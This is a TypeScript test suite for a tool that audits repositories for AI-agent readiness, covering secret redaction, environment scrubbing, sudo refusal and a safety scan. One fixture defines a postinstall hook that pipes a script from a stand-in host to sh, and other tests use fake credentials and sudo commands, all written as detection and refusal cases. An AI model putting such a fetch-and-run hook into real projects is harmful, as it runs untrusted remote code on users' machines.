import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, test } from "node:test";
import { orgSkillBuilders } from "../skill/agent-readiness/scripts/lib/assets.ts";
import { disconnectArgs, execArgs, startArgs } from "../skill/agent-readiness/scripts/lib/container.ts";
import { discoverContract } from "../skill/agent-readiness/scripts/lib/contract.ts";
import { diagnose } from "../skill/agent-readiness/scripts/lib/diagnose.ts";
import { weakening, weakeningFlags } from "../skill/agent-readiness/scripts/lib/diff.ts";
import { recordObservation } from "../skill/agent-readiness/scripts/lib/evidence.ts";
import { appendHistory, pushHistory, readHistory, storeAudit } from "../skill/agent-readiness/scripts/lib/history.ts";
import { allSites, applySite, chooseSites, sitesForLine, targetFiles } from "../skill/agent-readiness/scripts/lib/mutate.ts";
import { computeOutcomes, fetchPrs, isAgentPr } from "../skill/agent-readiness/scripts/lib/outcomes.ts";
import { buildProfile } from "../skill/agent-readiness/scripts/lib/profile.ts";
import { redact, scanText } from "../skill/agent-readiness/scripts/lib/redact.ts";
import { SUDO_REFUSED, hostExecutor, newBudget, runContract } from "../skill/agent-readiness/scripts/lib/replay.ts";
import { runCommand, scrubbedEnv } from "../skill/agent-readiness/scripts/lib/run.ts";
import { componentStates } from "../skill/agent-readiness/scripts/lib/score.ts";
import { loadRubric } from "../skill/agent-readiness/scripts/lib/rubric.ts";
import { ENV_KEYS, renderEnvFiles, renderVerifySkill } from "../skill/agent-readiness/scripts/lib/skill.ts";
import { extractFromMarkdown, instructionItems, safetyScan } from "../skill/agent-readiness/scripts/lib/static.ts";
import type { HistoryLine, PrRecord, ReportJson } from "../skill/agent-readiness/scripts/lib/types.ts";
import { paths, releaseManifest, skillDigest } from "../skill/agent-readiness/scripts/lib/workspace.ts";
import { FIXTURES, materialize } from "../tools/fixture.ts";
import { makeAudit } from "./helpers.ts";

const rubric = loadRubric("2026-10-alpha");
const tmp = () => mkdtempSync(join(tmpdir(), "readiness-test-"));
const fakeAws = () => "AKIA" + "ABCDEFGHIJKLMNOP";
const fakeGh = () => "ghp_" + "a1B2c3D4e5".repeat(4);

function gitRepo(files: Record<string, string>): string {
  const dir = tmp();
  for (const [rel, text] of Object.entries(files)) {
    mkdirSync(join(dir, rel, ".."), { recursive: true });
    writeFileSync(join(dir, rel), text);
  }
  execFileSync("git", ["init", "-q", "-b", "main"], { cwd: dir });
  commit(dir, "initial", "Contributor A", 120);
  return dir;
}

function commit(dir: string, message: string, author: string, daysAgo = 1): void {
  const date = new Date(Date.now() - daysAgo * 86400000).toISOString();
  execFileSync("git", ["add", "-A"], { cwd: dir });
  execFileSync("git", ["-c", "commit.gpgsign=false", "commit", "-q", "--allow-empty", "-m", message], { cwd: dir, env: { ...process.env, GIT_AUTHOR_NAME: author, GIT_AUTHOR_EMAIL: "x@example.com", GIT_COMMITTER_NAME: author, GIT_COMMITTER_EMAIL: "x@example.com", GIT_AUTHOR_DATE: date, GIT_COMMITTER_DATE: date } });
}

describe("redaction", () => {
  test("secrets are found by type and line and never echoed", () => {
    const text = `const a = 1;\nconst key = "${fakeAws()}";\ntoken: "${fakeGh()}"\n`;
    const hits = scanText(text);
    assert.deepEqual(hits.map((h) => [h.type, h.line]), [["AWS access key", 2], ["GitHub token", 3]]);
    const out = redact(text);
    assert.ok(!out.includes(fakeAws()) && !out.includes(fakeGh()));
    assert.match(out, /\[redacted:AWS access key\]/);
  });

  test("placeholder assignments aren't flagged, real-looking ones are", () => {
    assert.equal(scanText(`password = "example-password-123"`).length, 0);
    assert.equal(scanText(`api_key = "${"Zq9".repeat(5)}"`).length, 1);
  });

  test("registry values passed in are redacted from output", () => {
    assert.equal(redact("token is s3cr3t-value here", ["s3cr3t-value"]), "token is [redacted:env] here");
  });
});

describe("scrubbed environment", () => {
  test("the user's environment and credentials don't reach repo commands", () => {
    process.env.READINESS_TEST_SECRET = "do-not-leak";
    process.env.NPM_TOKEN = "registry-value";
    const env = scrubbedEnv({});
    assert.equal(env.READINESS_TEST_SECRET, undefined);
    assert.equal(env.NPM_TOKEN, undefined);
    assert.notEqual(env.HOME, process.env.HOME);
    assert.ok(env.HOME.includes("readiness-home-"));
    assert.equal(env.CI, "1");
    assert.equal(scrubbedEnv({ registryEnv: ["NPM_TOKEN"] }).NPM_TOKEN, "registry-value");
    assert.equal(scrubbedEnv({ inheritEnv: true }).READINESS_TEST_SECRET, "do-not-leak");
    delete process.env.READINESS_TEST_SECRET;
    delete process.env.NPM_TOKEN;
  });

  test("commands time out and are killed", async () => {
    const r = await runCommand("sleep 5", tmpdir(), scrubbedEnv({}), 1);
    assert.equal(r.timedOut, true);
    assert.equal(r.exitCode, null);
  });

  test("container runs pass registry variable names, never values", () => {
    process.env.NPM_TOKEN = "registry-value";
    const args = startArgs("c1", "node:22", "/tmp/x", ["NPM_TOKEN"]);
    assert.ok(args.includes("NPM_TOKEN"));
    assert.ok(!args.join(" ").includes("registry-value"));
    assert.deepEqual(execArgs("c1", "npm test", "packages/api").slice(0, 3), ["exec", "-w", "/work/packages/api"]);
    assert.deepEqual(disconnectArgs("c1"), ["network", "disconnect", "bridge", "c1"]);
    delete process.env.NPM_TOKEN;
  });
});

describe("evidence strength", () => {
  test("record refuses anything stronger than static", () => {
    const audit = makeAudit({ components: [{ id: "a", share: 1 }] });
    assert.throws(() => recordObservation(audit, rubric, { checkId: "verify.behavioral_oracle", result: "pass", strength: "executed", summary: "I ran it" }), /only `readiness run` and `readiness replay`/i);
    assert.throws(() => recordObservation(audit, rubric, { checkId: "bootstrap.cold_replay", result: "pass", strength: "clean_replay", summary: "x" }));
    const ev = recordObservation(audit, rubric, { checkId: "context.instructions_verified", result: "fail", strength: "static", summary: "README names a removed script" });
    assert.equal(ev.strength, "static");
  });
});

describe("diagnosis", () => {
  test("common failures map to causes", () => {
    assert.equal(diagnose("Error: connect ECONNREFUSED 127.0.0.1:5432", false, "test").service, "Postgres");
    assert.equal(diagnose("Error: Missing PAYMENTS_LIVE_KEY", false, "test").cause, "credential");
    assert.equal(diagnose("npm error 401 Unauthorized", false, "install").cause, "registry");
    assert.equal(diagnose("bash: pnpm: command not found", false, "test").cause, "missing_tool");
    assert.equal(diagnose("", true, "test").cause, "timeout");
  });

  test("a script's missing tool is found, and on a host fallback it's an environment limit, not a repo defect", () => {
    const d = diagnose(".cursor/install.sh: line 7: dotnet: command not found", false, "install");
    assert.deepEqual([d.cause, d.detail], ["missing_tool", "dotnet is not installed"]);
    assert.equal(diagnose("bash: line 1: sudo: command not found", false, "start").detail, "sudo is not installed");
    const audit = makeAudit({ components: [{ id: "app", share: 1, test: "not_run" }] });
    const install = audit.evidence.find((e) => e.kind === "install")!;
    Object.assign(install, { result: "fail", where: "fresh_copy", strength: "executed", diagnosis: d, summary: "install failed: dotnet is not installed" });
    const s = componentStates(audit, rubric, "app")["clean.install"];
    assert.equal(s.state, "unknown");
    assert.match(s.reason, /dotnet is not installed on this machine, an environment limit rather than a repo defect/);
    install.where = "container";
    assert.equal(componentStates(audit, rubric, "app")["clean.install"].state, "not_met", "in a clean container it is the repo's problem");
  });
});

describe("sudo", () => {
  test("the safety scan lists sudo in the environment setup, and instructions that use it aren't replayed", () => {
    const repo = materialize("nested-apps-dotnet");
    const profile = buildProfile(repo, repo, rubric);
    const elevated = safetyScan(repo, profile).filter((f) => f.kind === "elevated");
    assert.deepEqual(elevated.map((f) => [f.file, f.blocking]), [[".cursor/environment.json", false]]);
    assert.match(elevated[0].detail, /start runs sudo .*only inside a container, never on the host/);
    const node = materialize("healthy-node");
    writeFileSync(join(node, "AGENTS.md"), "- Publish locally: `npm run build && sudo cp -r dist /srv/www`\n");
    const items = instructionItems(node, { ...buildProfile(node, node, rubric), instructionFiles: ["AGENTS.md"] });
    assert.deepEqual(items.map((i) => [i.result, i.reason]), [["not_run", "not replayed: it uses sudo"]]);
  });

  test("a host fallback never runs a sudo command", async () => {
    const dir = tmp();
    const marker = join(dir, "ran-with-sudo");
    const ex = hostExecutor(dir, [], false);
    const direct = await ex.exec(`sudo touch ${marker}`, ".", 10);
    assert.notEqual(direct.exitCode, 0);
    assert.match(direct.output, /uses sudo/);
    const [start] = await runContract(ex, [{ id: "cmd-repo-start", kind: "start", component: "*", cwd: ".", command: `true && sudo touch ${marker}`, source: ".cursor/environment.json start", reason: "the repo's declared services", timeoutSec: 10 }], { components: new Set(), budget: newBudget(1, 1), registryValues: [] });
    assert.deepEqual([start.status, start.note], ["not_run", SUDO_REFUSED]);
    assert.equal(existsSync(marker), false);
  });
});

describe("static checks", () => {
  test("commands and paths are extracted from fences, inline code and links", () => {
    const md = "# X\n\n```bash\n$ npm ci\nnpm test\n```\n\nRun `npm run build` and see [setup](docs/setup.md) or `src/index.ts`.\n";
    const items = extractFromMarkdown(md);
    assert.deepEqual(items.map((i) => `${i.kind}:${i.text}:${i.line}`), ["command:npm ci:4", "command:npm test:5", "command:npm run build:8", "path:src/index.ts:8", "path:docs/setup.md:8"]);
  });

  test("continued lines join, and commands with paths on the author's machine aren't replayed", () => {
    const md = "```bash\npnpm --dir ~/Code/repo \\\n  example\n```\n";
    assert.deepEqual(extractFromMarkdown(md).map((i) => `${i.text}:${i.line}`), ["pnpm --dir ~/Code/repo example:2"]);
    const repo = gitRepo({ "package.json": JSON.stringify({ name: "x", scripts: { example: "node x.js" } }), "pnpm-lock.yaml": "", "README.md": md });
    const items = instructionItems(repo, buildProfile(repo, repo, rubric));
    assert.equal(items[0].category, "needs_access");
    assert.equal(items[0].result, "not_run");
  });

  test("paths outside the repo and ambiguous bare filenames aren't flagged", () => {
    const repo = gitRepo({ "package.json": JSON.stringify({ name: "x" }), "skill/SKILL.md": "x", "README.md": "Writes a `.canvas.tsx` file; see `SKILL.md` and [quickstart](../quickstart) and [docs](docs/missing.md).\n" });
    const items = instructionItems(repo, buildProfile(repo, repo, rubric));
    assert.deepEqual(items.map((i) => `${i.text}:${i.result}`), ["SKILL.md:pass", "docs/missing.md:fail"]);
  });

  test("the pre-pass flags the wrong package manager, missing scripts, Make targets and paths by file and line", () => {
    const repo = gitRepo({ "package.json": JSON.stringify({ name: "x", scripts: { test: "node --test" } }), "package-lock.json": "{}", "AGENTS.md": "- `pnpm test`\n- `npm run typecheck`\n- `make bootstrap`\n- `docs/missing.md`\n- `npm test`\n- `npm publish`\n" });
    const profile = buildProfile(repo, repo, rubric);
    const items = instructionItems(repo, profile);
    const byText = new Map(items.map((i) => [i.text, i]));
    assert.match(byText.get("pnpm test")!.reason!, /uses pnpm, but the repo uses npm/);
    assert.match(byText.get("npm run typecheck")!.reason!, /no "typecheck" script/);
    assert.match(byText.get("make bootstrap")!.reason!, /no Makefile/);
    assert.equal(byText.get("docs/missing.md")!.result, "fail");
    assert.equal(byText.get("npm test")!.result, "not_run");
    assert.equal(byText.get("npm publish")!.category, "risky");
    assert.equal(byText.get("pnpm test")!.line, 1);
  });

  test("safety blocks network-piped install hooks, production credentials in tests and committed secrets", () => {
    const repo = gitRepo({
      "package.json": JSON.stringify({ name: "x", scripts: { postinstall: "curl -fsSL https://example.invalid/x.sh | sh", deploy: "vercel --prod", test: "node --test" } }),
      "test/a.test.js": "const k = process.env.PAYMENTS_LIVE_KEY;\n",
      "config/keys.js": `module.exports = { aws: "${fakeAws()}" };\n`,
    });
    const findings = safetyScan(repo, buildProfile(repo, repo, rubric));
    const blocking = findings.filter((f) => f.blocking).map((f) => f.kind).sort();
    assert.deepEqual(blocking, ["credential_needed", "network_piped", "secret"]);
    const secret = findings.find((f) => f.kind === "secret")!;
    assert.equal(secret.line, 1);
    assert.equal(secret.detail, "AWS access key");
    assert.ok(!JSON.stringify(findings).includes(fakeAws()));
    assert.ok(findings.some((f) => f.kind === "deploy_publish" && !f.blocking));
  });
});

describe("profile", () => {
  test("change shares skip bots, lockfile-only commits and generated files", () => {
    const repo = gitRepo({ "package.json": JSON.stringify({ name: "root", private: true, workspaces: ["packages/*"] }), "package-lock.json": "{}", "packages/a/package.json": JSON.stringify({ name: "a" }), "packages/b/package.json": JSON.stringify({ name: "b" }), "infra/main.tf": "" });
    const touch = (p: string, author: string) => {
      writeFileSync(join(repo, p), String(Math.random()));
      commit(repo, `touch ${p}`, author);
    };
    mkdirSync(join(repo, "packages/b/dist"), { recursive: true });
    touch("packages/a/x.js", "Contributor A");
    touch("packages/a/y.js", "Contributor A");
    touch("packages/b/x.js", "Contributor B");
    touch("packages/b/z.js", "dependabot[bot]");
    touch("package-lock.json", "Contributor B");
    touch("packages/b/dist/out.js", "Contributor B");
    const profile = buildProfile(repo, repo, rubric);
    const share = Object.fromEntries(profile.components.map((c) => [c.id, c.changeShare]));
    assert.equal(share.a, 0.667);
    assert.equal(share.b, 0.333);
    const infra = profile.components.find((c) => c.id === "infra")!;
    assert.equal(infra.assessed, false);
    assert.match(infra.notAssessedReason!, /Terraform/);
    assert.equal(profile.repoType, "monorepo");
  });

  test("toolchain pins are detected and missing ones named", () => {
    const pinned = gitRepo({ "package.json": JSON.stringify({ name: "x", packageManager: "pnpm@9.0.0" }), "pnpm-lock.yaml": "", ".nvmrc": "22\n" });
    assert.equal(buildProfile(pinned, pinned, rubric).toolchain.pinned, true);
    const loose = gitRepo({ "package.json": JSON.stringify({ name: "x" }), "pnpm-lock.yaml": "" });
    assert.deepEqual(buildProfile(loose, loose, rubric).toolchain.missing.length, 2);
  });

  test("standalone packages under apps/ are found with no root workspace, each with its own install", () => {
    const repo = gitRepo({
      "apps/web/package.json": JSON.stringify({ name: "@shop/web", engines: { node: ">=22" }, scripts: { test: "node --test" } }),
      "apps/web/package-lock.json": "{}",
      "apps/tool/package.json": JSON.stringify({ name: "tool", scripts: { test: "node --test" } }),
      "services/core/Core.csproj": "<Project />",
      "services/core/Orders.cs": "",
    });
    const profile = buildProfile(repo, repo, rubric);
    const byId = Object.fromEntries(profile.components.map((c) => [c.id, c]));
    assert.deepEqual(Object.keys(byId).sort(), ["services", "tool", "web"]);
    assert.equal(byId.web.path, "apps/web");
    assert.equal(byId.web.assessed, true);
    assert.equal(byId.tool.assessed, true);
    assert.equal(byId.services.assessed, false);
    assert.match(byId.services.notAssessedReason!, /\.NET/);
    assert.deepEqual(profile.lockfiles, ["apps/web/package-lock.json"]);
    const installs = discoverContract(profile, repo, rubric, []).filter((c) => c.kind === "install");
    assert.deepEqual(installs.map((c) => [c.component, c.cwd, c.command]), [["tool", "apps/tool", "npm install"], ["web", "apps/web", "npm ci"]]);
    assert.ok(profile.toolchain.missing.some((m) => m.includes("for tool")), JSON.stringify(profile.toolchain));
  });

  test("next to a root package, only nested packages with their own lockfile count, and an unreadable toolchain still gets a reason", () => {
    const repo = gitRepo({ "package.json": JSON.stringify({ name: "root" }), "package-lock.json": "{}", "site/package.json": JSON.stringify({ name: "site" }), "site/package-lock.json": "{}", "examples/demo/package.json": JSON.stringify({ name: "demo" }) });
    assert.deepEqual(buildProfile(repo, repo, rubric).components.map((c) => c.path).sort(), [".", "site"]);
    const dotnetOnly = gitRepo({ "src/Core.csproj": "<Project />", "src/Orders.cs": "" });
    const tc = buildProfile(dotnetOnly, dotnetOnly, rubric).toolchain;
    assert.equal(tc.pinned, false);
    assert.ok(tc.missing.length > 0 && tc.missing.every((m) => m.trim().length > 0));
  });
});

describe("planted faults", () => {
  test("each operator makes the expected edit and never touches strings or comments", () => {
    const ops = (l: string) => sitesForLine(l, "js").map((s) => `${s.operator}:${s.after.trim()}`);
    assert.deepEqual(ops("  if (a < b) {"), ["boundary_flip:if (a <= b) {", "negate_condition:if (!(a < b)) {"]);
    assert.deepEqual(ops("  return page + 1;"), ["shift_by_one:return page - 1;", "change_constant:return page + 2;"]);
    assert.deepEqual(ops("  return true;"), ["swap_return:return false;"]);
    assert.deepEqual(ops('  throw new Error("x < y");'), ["drop_throw_or_return:void 0;"]);
    assert.deepEqual(ops('  const s = "a < b and 5";'), []);
    assert.deepEqual(ops("  // if (a < b) return 1;"), []);
    assert.deepEqual(sitesForLine("    if score >= 90:", "py").map((s) => s.after.trim()), ["if score > 90:", "if not (score >= 90):", "if score >= 91:"]);
  });

  test("targets are files the tests import, and the seed decides the pick", () => {
    const repo = materialize("monorepo-mixed");
    const comps = buildProfile(repo, repo, rubric).components;
    const worker = comps.find((c) => c.id === "worker")!;
    assert.deepEqual(targetFiles(repo, worker), ["packages/worker/src/retry.js"]);
    const a = chooseSites(repo, repo, worker, "seed-1", 5).map((s) => `${s.line}:${s.operator}`);
    assert.deepEqual(chooseSites(repo, repo, worker, "seed-1", 5).map((s) => `${s.line}:${s.operator}`), a, "same seed, same faults");
    const seeds = ["seed-2", "seed-3", "seed-4"].map((s) => chooseSites(repo, repo, worker, s, 5).map((x) => `${x.line}:${x.operator}`).join());
    assert.ok(seeds.some((s) => s !== a.join()), "a fresh seed picks different faults");
  });

  test("the healthy fixture's tests catch every possible planted fault, so any seed passes", () => {
    const repo = materialize("healthy-node");
    const file = "src/pricing.js";
    const original = readFileSync(join(repo, file), "utf8");
    const sites = allSites(repo, [file], "js");
    assert.ok(sites.length >= 10);
    const env = { ...process.env };
    delete env.NODE_TEST_CONTEXT;
    for (const s of sites) {
      writeFileSync(join(repo, file), applySite(original, s));
      let failed = false;
      try {
        execFileSync(process.execPath, ["--test"], { cwd: repo, stdio: "ignore", env });
      } catch {
        failed = true;
      }
      writeFileSync(join(repo, file), original);
      assert.ok(failed, `${s.operator} on line ${s.line} survived: ${s.after.trim()}`);
    }
  });
});

describe("weakened tests", () => {
  test("diff flags deleted tests, removed cases, new skip markers and CI changes", () => {
    const repo = gitRepo({ "test/a.test.js": 'test("one", () => {});\ntest("two", () => {});\n', "test/b.test.js": 'test("three", () => {});\n', ".github/workflows/ci.yml": "on: push\n" });
    const from = execFileSync("git", ["rev-parse", "HEAD"], { cwd: repo, encoding: "utf8" }).trim();
    writeFileSync(join(repo, "test/a.test.js"), 'test.skip("one", () => {});\n');
    rmSync(join(repo, "test/b.test.js"));
    writeFileSync(join(repo, ".github/workflows/ci.yml"), "on: pull_request\n");
    commit(repo, "weaken", "Contributor B");
    const to = execFileSync("git", ["rev-parse", "HEAD"], { cwd: repo, encoding: "utf8" }).trim();
    const w = weakening(repo, from, to);
    assert.deepEqual(w.deletedTestFiles, ["test/b.test.js"]);
    assert.equal(w.newSkipMarkers.length, 1);
    assert.ok(w.removedTestCases >= 1);
    assert.deepEqual(weakeningFlags(w), ["deleted test files", "removed test cases", "new skip markers", "CI changed"]);
    assert.deepEqual(weakeningFlags(weakening(repo, to, to)), []);
  });
});

describe("remediation outputs", () => {
  test("draft-skill uses only commands that passed and refuses others", () => {
    const audit = makeAudit({ components: [{ id: "a", share: 1, lint: "fail", faults: "pass" }] });
    const { text, commands } = renderVerifySkill(audit, rubric);
    assert.deepEqual(commands.map((c) => c.id), ["cmd-repo-install", "cmd-a-test"]);
    assert.ok(!text.includes("npm run lint"));
    assert.throws(() => renderVerifySkill(audit, rubric, ["cmd-a-lint"]), /no passing run/);
    const none = makeAudit({ components: [{ id: "a", share: 1, test: "fail" }] });
    assert.throws(() => renderVerifySkill(none, rubric), /nothing to put in a verify skill/);
  });

  test("environment.json uses only schema-declared fields", () => {
    const audit = makeAudit({ components: [{ id: "a", share: 1 }] });
    for (const dockerfile of [false, true]) {
      const env = renderEnvFiles(audit, ["postgres"], { dockerfile });
      for (const key of Object.keys(env.environmentJson)) assert.ok(ENV_KEYS.has(key), key);
      assert.ok(!("$schema" in env.environmentJson));
      assert.match(env.files["scripts/agent-start.sh"], /pg_isready/);
    }
  });
});

describe("outcomes", () => {
  const pr = (n: number, head: string, extra: Partial<PrRecord> = {}): PrRecord => ({ number: n, headRefName: head, author: "someone", labels: [], createdAt: new Date(Date.now() - 3 * 86400000).toISOString(), mergedAt: null, state: "OPEN", files: [], firstCheck: "success", changesRequested: false, ...extra });
  const f = { branchPrefixes: ["cursor/"], labels: ["agent"], authors: ["agent-bot"], coAuthorTrailers: ["Cursor Agent"] };

  test("the agent-PR filter matches by branch prefix, label, author or co-author trailer", () => {
    assert.ok(isAgentPr(pr(1, "cursor/x"), f));
    assert.ok(isAgentPr(pr(2, "x", { labels: ["agent"] }), f));
    assert.ok(isAgentPr(pr(3, "x", { author: "agent-bot" }), f));
    assert.ok(isAgentPr(pr(4, "x", { coAuthors: ["Cursor Agent <agent@cursor.com>"] }), f));
    assert.ok(!isAgentPr(pr(5, "feature/x"), f));
  });

  test("a PR touching several components counts in each", () => {
    const comps = makeAudit({ components: [{ id: "api", share: 0.5 }, { id: "shared", share: 0.5 }] }).profile!.components;
    const o = computeOutcomes([pr(1, "cursor/a", { files: ["api/x.js", "shared/y.js"] }), pr(2, "main-ish", { files: ["api/z.js"] })], comps, rubric, f, 30, "file");
    assert.equal(o.agent.opened, 1);
    assert.equal(o.control.opened, 1);
    assert.equal(o.byComponent.api.opened + o.byComponent.shared.opened, 2);
    assert.equal(o.multiComponentPrs, 1);
  });

  test("gh results become PR records with first-push CI and change requests", () => {
    const bin = tmp();
    writeFileSync(join(bin, "gh"), `#!/usr/bin/env bash
if [ "$1" = "pr" ]; then echo '[{"number":7,"headRefName":"cursor/fix","author":{"login":"a"},"labels":[{"name":"bug"}],"createdAt":"2026-10-20T00:00:00Z","mergedAt":null,"state":"OPEN","files":[{"path":"api/x.js"}],"reviews":[{"state":"CHANGES_REQUESTED"}],"commits":[{"oid":"abc","messageBody":"Co-authored-by: Cursor Agent <a@example.com>"}]}]'; exit 0; fi
if [ "$1" = "api" ]; then echo '{"check_runs":[{"conclusion":"failure","status":"completed"}]}'; exit 0; fi
exit 1
`);
    chmodSync(join(bin, "gh"), 0o755);
    const old = process.env.PATH;
    process.env.PATH = `${bin}:${old}`;
    try {
      const prs = fetchPrs("example-org/example", 30);
      assert.equal(prs.length, 1);
      assert.equal(prs[0].firstCheck, "failure");
      assert.equal(prs[0].changesRequested, true);
      assert.deepEqual(prs[0].coAuthors, ["Cursor Agent"]);
    } finally {
      process.env.PATH = old;
    }
  });
});

describe("org skill builders", () => {
  test("lists top builders from GitHub code search, labeled and capped", () => {
    const bin = tmp();
    writeFileSync(join(bin, "gh"), `#!/usr/bin/env bash
case "$*" in
  *search/code*filename:SKILL.md*page=1*) echo '{"items":[{"path":".cursor/skills/a/SKILL.md","repository":{"full_name":"org/one"}},{"path":".cursor/skills/b/SKILL.md","repository":{"full_name":"org/two"}}]}';;
  *search/code*) echo '{"items":[]}';;
  *repos/org/one/commits*) echo '[{"commit":{"author":{"name":"B","date":"2026-10-20T00:00:00Z"}},"author":{"login":"builder-b"}},{"commit":{"author":{"name":"A","date":"2026-01-01T00:00:00Z"}},"author":{"login":"builder-a"}}]';;
  *repos/org/two/commits*) echo '[{"commit":{"author":{"name":"A","date":"2026-10-21T00:00:00Z"}},"author":{"login":"builder-a"}}]';;
  *) echo '[]';;
esac
`);
    chmodSync(join(bin, "gh"), 0o755);
    const old = process.env.PATH;
    process.env.PATH = `${bin}:${old}`;
    try {
      const r = orgSkillBuilders("org");
      assert.equal(r.label, "GitHub-visible repos only");
      assert.equal(r.builders[0].name, "builder-a");
      assert.equal(r.builders[0].skillsWritten, 2);
      assert.equal(orgSkillBuilders("org", 1).capped, true);
    } finally {
      process.env.PATH = old;
    }
  });
});

describe("records", () => {
  test("nothing containing a secret is written to history", () => {
    const repo = gitRepo({ "a.txt": "x" });
    const p = paths(repo);
    const audit = makeAudit({ components: [{ id: "a", share: 1 }] });
    audit.evidence[0].summary = `leaked ${fakeGh()}`;
    assert.throws(() => storeAudit(p, audit, {} as ReportJson, ""), /Refusing to write/);
  });

  test("history goes to its own branch, and readHistory falls back to it", () => {
    const repo = gitRepo({ "a.txt": "x" });
    const p = paths(repo);
    const line: HistoryLine = { id: "aud-1", kind: "audit", date: "2026-10-27", commit: "abc", rubric: "2026-10-alpha", scriptsDigest: "x", result: "sealed", goal: "bug_fixes", levels: {}, repoLevels: { bug_fixes: 1 }, shares: {}, active: [], seedPinned: false };
    appendHistory(p, line);
    assert.match(pushHistory(p, { push: false, remote: "origin" }), /committed history/);
    rmSync(p.history, { recursive: true });
    assert.deepEqual(readHistory(p).map((h) => h.id), ["aud-1"]);
    assert.equal(execFileSync("git", ["branch", "--show-current"], { cwd: repo, encoding: "utf8" }).trim(), "main");
  });
});

describe("rubric and release", () => {
  test("every condition an activity needs exists and has a roadmap template", () => {
    for (const a of rubric.activities) for (const c of [...rubric.level1, ...a.level2]) assert.ok(rubric.conditions[c], c);
    for (const c of Object.keys(rubric.conditions)) assert.ok(Object.keys(rubric.templates).some((t) => t === c || t.startsWith(c + ":")), `template for ${c}`);
    assert.equal(rubric.scale.length, 5);
  });

  test("template titles that reach part 1 use no banned terms", () => {
    for (const [id, t] of Object.entries(rubric.templates)) for (const term of rubric.part1.bannedTerms) assert.ok(!t.title.toLowerCase().includes(term.toLowerCase()), `${id}: ${term}`);
  });

  test("RELEASE.json matches the scripts (run npm run release-manifest after changing them)", () => {
    assert.equal(releaseManifest()?.scriptsDigest, skillDigest());
  });

  test("fixtures keep agent files under fixture names so they don't steer agents in this repo", () => {
    const out = execFileSync("git", ["ls-files", FIXTURES], { encoding: "utf8" });
    for (const f of out.split("\n").filter(Boolean)) assert.ok(!/\/(AGENTS|CLAUDE|SKILL)\.md$|\/\.cursor\/|\/\.github\/|\/\.npmrc$/.test(f), f);
  });
});
